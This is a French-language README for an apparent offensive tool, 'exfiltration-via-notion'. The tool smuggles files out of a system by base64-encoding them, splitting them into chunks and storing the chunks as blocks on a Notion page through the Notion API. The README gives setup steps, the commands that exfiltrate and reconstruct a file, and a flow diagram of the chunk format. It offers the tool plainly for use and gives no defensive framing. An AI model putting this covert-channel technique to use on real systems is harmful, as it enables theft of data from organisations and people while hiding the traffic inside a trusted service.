# exfiltration-via-notion

Outil d'exfiltration de données utilisant l'API Notion comme canal de transport. Les fichiers sont encodés en base64, découpés en chunks et stockés sous forme de blocs dans une page Notion.

Fonctionne avec n'importe quel type de fichier (.txt, .json, .py, binaires, etc.)

## Prérequis

- `bash`
- `curl`
- `base64` (coreutils)
- `python3`

## Configuration Notion

### 1. Créer une intégration

1. Aller sur [notion.so/my-integrations](https://www.notion.so/my-integrations)
2. Cliquer **"New integration"**
3. Donner un nom → copier le **token** généré

### 2. Créer une page et la relier à l'intégration

1. Créer une nouvelle page dans Notion
2. Cliquer sur **`...`** en haut à droite → **Connections**
3. Rechercher et sélectionner l'intégration créée → **Connect**
4. Copier l'**ID de la page** depuis l'URL : `notion.so/`**`<page-id>`**

### 3. Configurer le `.env`

```bash
cp .env.example .env
```

Renseigner les valeurs dans `.env` :

```
TOKEN=ton_token_notion
PAGE_ID=id_de_ta_page
```

## Usage

### Exfiltrer un fichier

```bash
./exfiltration.sh /chemin/vers/fichier
```

### Reconstruire le fichier

```bash
./reconstruct.sh nom_du_fichier
```

Le fichier est reconstruit dans le répertoire courant.

## Flow

```
fichier → base64 → chunks 1900 chars → blocs Notion
                                             ↓
                    [EXFIL:001/007:fichier.txt] SGVsbG8K...
                    [EXFIL:002/007:fichier.txt] 3dHJlYW0K...

reconstruct → fetch blocs → tri par index → décode base64 → fichier original
```
